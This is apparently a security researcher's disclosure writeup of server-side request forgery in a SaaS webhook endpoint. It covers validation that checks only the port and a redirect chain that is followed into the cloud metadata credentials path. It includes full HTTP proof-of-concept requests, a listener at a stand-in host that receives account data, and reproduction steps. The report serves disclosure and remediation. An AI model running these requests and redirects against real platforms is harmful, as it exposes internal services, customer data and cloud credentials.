# Webhook creation accepts internal addresses and follows redirects to the metadata service

## Summary

The webhook creation endpoint accepted any URL on port 80 or 443, with no hostname validation and no address blocklist, so loopback and link-local destinations were stored. Triggering delivery sent the payload to an attacker-controlled host from the platform's own network, and the delivery client followed a two-hop redirect chain into the instance metadata credentials path.

## Context

A SaaS platform. Webhooks are configured per environment and fire when an object changes. The access needed was an API token for a low-privileged role, the kind of token an ordinary user holds rather than an administrator credential.

## How I found it

### Where I started

Webhooks are the part of a SaaS product that makes outbound requests on the customer's behalf, which means the customer picks the destination. That is where request forgery of this shape usually lives, so I started with the URL field and asked what it would refuse.

### What it accepted

Almost nothing. A webhook pointed at loopback on port 80 came back `201 Created`, and so did one pointed at the link-local metadata address. The only constraint I could find was the port number. There was no hostname check and no address blocklist, so any internal host the platform could reach was a valid destination.

### Confirming the request is actually made

Accepting a URL and firing it are different things. I created a webhook pointing at an out-of-band interaction server I controlled and changed an object to trigger delivery. The interaction server received an HTTP `POST` from the platform's egress address, carrying a user agent identifying the platform and several KB of data, which is the object's configuration plus account information.

### The redirect

The only restriction that existed applied at creation time. I ran a small server that answered with a `302` to a second path, which answered with another `302` to the credentials path on the metadata address. The delivery client followed both hops and arrived at the metadata endpoint. A redirect moves the request past whatever creation checked, because nothing repeats the check at delivery time.

### What it meant

A low-privileged API token could make the platform's servers issue a request to a destination the token holder chose, from inside the platform's own network, and the delivery client would follow redirects into link-local space.

## Proof of concept

Creation-time validation, with a loopback destination:

```http
POST /api/v2/webhooks HTTP/1.1
Host: app.example
Authorization: Bearer [REDACTED]
Content-Type: application/json

{"url": "http://127.0.0.1:80/", "on": true, "statements": []}
```

```http
HTTP/1.1 201 Created
```

The same for the metadata address:

```http
POST /api/v2/webhooks HTTP/1.1
Host: app.example
Authorization: Bearer [REDACTED]
Content-Type: application/json

{"url": "http://<metadata-address>/latest/meta-data/", "on": true, "statements": []}
```

```http
HTTP/1.1 201 Created
```

Delivery confirmation, with the webhook pointed at a listener I controlled and triggered by an object change:

```http
POST /api/v2/webhooks HTTP/1.1
Host: app.example
Authorization: Bearer [REDACTED]
Content-Type: application/json

{"url": "http://192.0.2.10/hook", "on": true, "statements": []}
```

```http
HTTP/1.1 201 Created
```

```http
PATCH /api/v2/items/1001 HTTP/1.1
Host: app.example
Authorization: Bearer [REDACTED]
Content-Type: application/json
```

At the listener:

```http
POST /hook HTTP/1.1
Host: 192.0.2.10
User-Agent: <product user agent>

<object configuration and account data, about 7 KB>
```

The redirect chain, served from that listener:

```http
HTTP/1.1 302 Found
Location: http://192.0.2.10/confirm-redirect
```

```http
HTTP/1.1 302 Found
Location: http://<metadata-address>/latest/meta-data/iam/security-credentials/
```

Both hops were followed, and the last request was made from the platform's egress address.

## Steps to reproduce

Preconditions: a low-privileged API token, one object that fires webhooks, and a listener you control.

1. Create a webhook whose URL is `http://127.0.0.1:80/`. Expect a rejection; actual `201 Created`.
2. Create one whose URL is the link-local metadata address. Expect a rejection; actual `201 Created`.
3. Create a webhook pointing at your listener, then change the object to trigger delivery.
4. Watch the delivery arrive at the listener, from the platform's address, with the object's configuration and account data in the body.
5. Configure the listener to answer `302` to a second path, and that path to answer `302` to the metadata credentials path. Trigger delivery again.
6. Watch both redirects being followed, the final request addressed to the metadata endpoint.

## Impact

A low-privileged token could store a webhook aimed at any address the delivery network reaches on ports 80 and 443, loopback and link-local included, and could have the platform send object configuration and account data to a host the token holder controls. Because delivery comes from the platform's own egress addresses, it also bypasses any IP allowlist in front of an internal service.

The redirect chain was followed into the instance metadata credentials path. The response from that last hop was not captured, so this writeup does not claim credentials were returned; what is demonstrated is that the platform's client made the request.

## Root cause and fix

The observed behavior is consistent with creation-time validation that inspects only the port and never the resolved address, and with a delivery client that follows redirects without re-checking where it is going.

Reject internal ranges at creation, including loopback, private, link-local and their IPv6 equivalents, and check both the resolved address and every redirect target again at delivery time. An allowlist for webhook egress is better than a blocklist, and the metadata service should require a session token with a hop limit so a request that reaches it is not enough on its own.

## What I learned

The interesting question was not whether the field accepted a bad address, because it plainly did. It was whether the platform would actually go there. Out-of-band confirmation turned a `201` into an observation, and the redirect showed that a check at creation is not a check at use.
